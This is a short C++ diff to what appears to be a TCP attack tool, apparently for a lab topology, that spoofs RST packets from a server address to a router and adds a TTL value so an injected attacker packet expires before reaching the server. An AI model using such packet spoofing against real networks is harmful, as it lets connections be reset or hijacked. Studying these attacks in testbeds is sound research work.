@@ -21,7 +21,7 @@ int main(int argc, char **argv) {
   // Get the values for this run
   Configuration config = Configuration::args(argc, argv);
 
-    // Compute the attacker and router address given the configuration and the
+  // Compute the attacker and router address given the configuration and the
   // current port
   TCPPacket::Address attacker_addr{
       .ip = config.topology.attacker_ip,
@@ -40,7 +40,7 @@ int main(int argc, char **argv) {
   uint32_t server_isn = isn_dist(isn_engine);
   uint32_t attacker_isn = isn_dist(isn_engine);
 
-  // Spoof RST packets to the victim from the server
+  // Spoof RST packets to the router from the server
   send_pkt(config, TCPPacket{
                        .src = config.topology.server_addr,
                        .dst = router_addr,
@@ -66,6 +66,7 @@ int main(int argc, char **argv) {
   send_pkt(config, TCPPacket{
                        .src = attacker_addr,
                        .dst = config.topology.server_addr,
+                       .ttl = config.topology.server_ttl_drop,
                        .seqno = attacker_isn,
                        .ackno = std::nullopt,
                        .psh = true,
